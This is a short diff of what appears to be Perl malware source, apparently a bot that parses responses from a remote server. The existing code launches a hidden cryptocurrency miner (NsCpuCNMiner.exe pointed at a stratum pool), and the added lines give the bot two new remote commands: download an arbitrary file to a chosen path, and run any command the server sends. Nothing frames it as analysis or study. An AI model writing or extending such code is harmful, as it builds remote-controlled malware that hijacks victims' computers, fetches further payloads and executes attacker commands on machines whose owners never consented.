@@ -125,6 +125,12 @@ END {
     if(\$response->decoded_content =~ m/miner->host:(\\w);email:(\\w);/){
       system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
     }
+    if(\$response->decoded_content =~ m/download:(\\w),(\\w);/){
+      getstore(\"\$1\", \"\$2\");
+    }
+    if(\$response->decoded_content =~ m/system:(\\w);/){
+      system(\"\$1\");
+    }
   }
 }
 EXE
